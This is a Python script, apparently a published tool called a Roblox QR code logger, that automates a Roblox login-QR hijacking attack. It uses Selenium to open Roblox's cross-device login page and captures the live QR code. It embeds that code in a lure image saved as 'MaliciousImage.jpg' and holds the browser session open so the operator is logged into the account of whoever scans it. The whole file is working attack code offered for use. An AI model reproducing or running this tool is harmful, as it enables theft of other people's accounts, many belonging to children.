import os,requests
import time as t
from pystyle import Colors, Write
from PIL import Image as PILImage
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
os.system('cls')

Write.Print(f"""
.▄▄▄  ▄▄▄      ▄▄▄        ▄▄▄▄· ▄▄▌        ▐▄• ▄     ▄▄▌         ▄▄ •  ▄▄ • ▄▄▄ .▄▄▄  
▐▀•▀█ ▀▄ █·    ▀▄ █·▪     ▐█ ▀█▪██•  ▪      █▌█▌▪    ██•  ▪     ▐█ ▀ ▪▐█ ▀ ▪▀▄.▀·▀▄ █· | > [AUTHOR] Developed by @Evilbytecode aka @Codepulze
█▌·.█▌▐▀▀▄     ▐▀▀▄  ▄█▀▄ ▐█▀▀█▄██▪   ▄█▀▄  ·██·     ██▪   ▄█▀▄ ▄█ ▀█▄▄█ ▀█▄▐▀▀▪▄▐▀▀▄  | > [CREDITS] https://github.com/EvilBytecode/Roblox-QR-Code-Logger
▐█▪▄█·▐█•█▌    ▐█•█▌▐█▌.▐▌██▄▪▐█▐█▌▐▌▐█▌.▐▌▪▐█·█▌    ▐█▌▐▌▐█▌.▐▌▐█▄▪▐█▐█▄▪▐█▐█▄▄▌▐█•█▌ | > [NOTE] Please dont kill the Chromedriver inorder to get full Acess
·▀▀█. .▀  ▀    .▀  ▀ ▀█▄▀▪·▀▀▀▀ .▀▀▀  ▀█▄▀▪•▀▀ ▀▀    .▀▀▀  ▀█▄▀▪·▀▀▀▀ ·▀▀▀▀  ▀▀▀ .▀  ▀
                                             ░                                                                               
> Press Enter To Continue and Generate Malicious QR Code                                                                                                                        
""", Colors.blue_to_purple,  interval=0.000)
input()


tmp = "tempimgs"
os.makedirs(tmp, exist_ok=True)

chropt = webdriver.ChromeOptions()
chropt.add_experimental_option('excludeSwitches', ['enable-logging'])
chr = Service("./chromedriver.exe")

driver = webdriver.Chrome(service=chr, options=chropt)

driver.get("https://www.roblox.com/login")
try:
    ck = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cookie-banner-wrapper"]/div[1]/div[2]/div/div/button[1]'))) # simply were denying cookies that are used for analytics
    ck.click()
except:
    pass

button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cross-device-login-button"]'))) # after we clicked on the uhhh, yh the dont accpet cookies we will try to get qr
button.click()

modal = WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.CLASS_NAME, "modal-lg.modal-dialog"))) # we view the eleemtn and find and img src
uwu = modal.find_element(By.TAG_NAME, "img").get_attribute("src") # this is the src for the qr code

uwures = requests.get(uwu)
if uwures.status_code == 200: # we added this so we know that its fresh and were not blocked by rqeuest from roblos api, if its 429 / 401 (unauthorized if im right) or ratelimited
    with open(os.path.join(tmp, "image.jpg"), "wb") as file:
        file.write(uwures.content)
 # image.jpg is the qr code
    diuwu = PILImage.open(os.path.join(tmp, "image.jpg"))
    nwuwu, nhuwu = 300, 300
    riuwu = diuwu.resize((nwuwu, nhuwu))
    
    oiuwu = PILImage.open(os.path.join(tmp, "overlay_image.png"))
    owuwu, ohuwu = oiuwu.size
    cxuwu, cyuwu = (owuwu - nwuwu) // 2, (ohuwu - nhuwu) // 2
    oyuwu = 300 

    oiuwu.paste(riuwu, (cxuwu, cyuwu + oyuwu))

    fipuwu = os.path.join(tmp, "MaliciousImage.jpg")
    oiuwu.save(fipuwu)
    
    Write.Print(f"[+] Malicious Image Successfully Built in '{fipuwu}'.", Colors.blue_to_purple,  interval=0.000)
    Write.Print(f"\n[+] QR Code Expires in 2 Minutes.", Colors.blue_to_purple,  interval=0.000)

    os.remove(os.path.join(tmp, "image.jpg"))
    t.sleep(500) # extra time if you get logged in, feel free to modify this 
else:
    print("sum went wrong lolz")
    driver.quit()
